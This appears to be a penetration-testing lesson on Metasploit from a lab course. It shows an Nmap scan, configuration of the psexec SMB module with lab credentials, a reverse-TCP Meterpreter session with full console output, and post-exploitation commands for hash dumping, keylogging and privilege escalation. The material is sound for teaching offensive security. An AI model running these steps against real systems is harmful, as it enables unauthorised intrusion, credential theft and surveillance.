# Automating Payloads & Delivery with Metasploit

**[Metasploit Framework](https://www.metasploit.com/)** is an automated attack framework developed by Rapid7 that consolidates exploit modules, payload generation, and post-exploitation capabilities into a single interface. The community edition is freely available and covers the core exploit and payload workflows covered in this section; the commercial **[Metasploit Pro](https://www.rapid7.com/products/metasploit/download/editions/)** edition extends this with automated exploitation, web application scanning, social engineering campaigns, IDS/IPS evasion, and enterprise-grade reporting. Understanding what each module and payload is doing remains the operator's responsibility regardless of which edition is used; using automated tooling without that understanding risks causing unintended damage on a live engagement.

## Starting MSF

Launch `msfconsole` as root to start the framework:

```bash
sudo msfconsole
```

The banner on startup reports the current module counts, of which two are directly relevant to this section:

- **2131 exploits** covering a broad range of services, operating systems, and applications
- **592 payloads** spanning stageless and staged formats across Windows, Linux, and other platforms

These numbers change as maintainers add or remove modules and as the operator imports custom modules into the local installation.

## Selecting a Module from Nmap Recon

Metasploit module selection starts with reconnaissance output. The following Nmap scan identifies the target as a Windows host with SMB exposed:

```bash
nmap -sC -sV -Pn 10.129.164.25
```

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

SMB on port 445 is identified as the attack vector. From within `msfconsole`, search for relevant modules:

```bash
msf6 > search smb
```

The results return a numbered table of matching modules. Module numbering is relative to the current search and may shift as new modules are added; always verify the module path before selecting by number.

## Module Anatomy: psexec

The module selected for this scenario is `exploit/windows/smb/psexec`. Each component of the module path carries meaning:

| Path Component | Meaning |
|---|---|
| `exploit/` | Module type; exploit modules include both the attack logic and a payload to establish a shell |
| `windows/` | Target platform |
| `smb/` | Service being attacked |
| `psexec` | The mechanism used to deliver and execute the payload on the target (uses the [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) execution model) |

Select the module and inspect its options:

```bash
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > options
```

The options output reveals two sets of configurable parameters: module options (target details and credentials) and payload options (listener address and port). The default payload assigned automatically is `windows/meterpreter/reverse_tcp`.

## Configuring and Executing the Module

Set each required option with the `set` command:

```bash
set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.14.222
```

These options instruct the module to target the specified host (`RHOSTS`), authenticate using the provided credentials (`SMBUser` and `SMBPass`), upload the payload to the default administrative share (`ADMIN$`), and initiate a reverse connection back to the operator's machine (`LHOST`). Run the exploit:

```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675)

meterpreter >
```

The staged delivery is visible in the output: the initial stager connects, authenticates, and pulls the full Meterpreter stage (175,174 bytes) across the TCP connection before establishing the session.

## Meterpreter

**Meterpreter** is the default payload in Metasploit and operates fundamentally differently from a raw TCP shell. It uses reflective DLL injection to load entirely into the memory of the compromised process, writing nothing to disk and creating no new processes. Communication with the attack box is encrypted over TLS, and the payload loads extensions dynamically at runtime, meaning capabilities can be added without restarting the session. This produces a minimal forensic footprint compared to a binary dropped to disk.

Core post-exploitation capabilities available within a Meterpreter session:

- `getsystem`: attempts privilege escalation to SYSTEM level
- `hashdump`: extracts local account password hashes from the SAM database
- `upload` / `download`: transfers files between the attack box and target
- `run post/multi/recon/local_exploit_suggester`: identifies local privilege escalation paths
- `keyscan_start` / `keyscan_dump`: keylogger functionality
- `shell`: drops into a native system-level command shell when the full set of OS commands is required

## Dropping to a System Shell

When native OS commands are needed beyond what Meterpreter exposes directly, use the `shell` command to open an interactive `cmd.exe` session on the target:

```bash
meterpreter > shell

Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

The `shell` command spawns a new process on the target and attaches it to the Meterpreter channel, giving full access to the native Windows command environment. Return to the Meterpreter session at any time with `Ctrl+Z` to background the channel, then interact with the session again using `channel -i 1`.
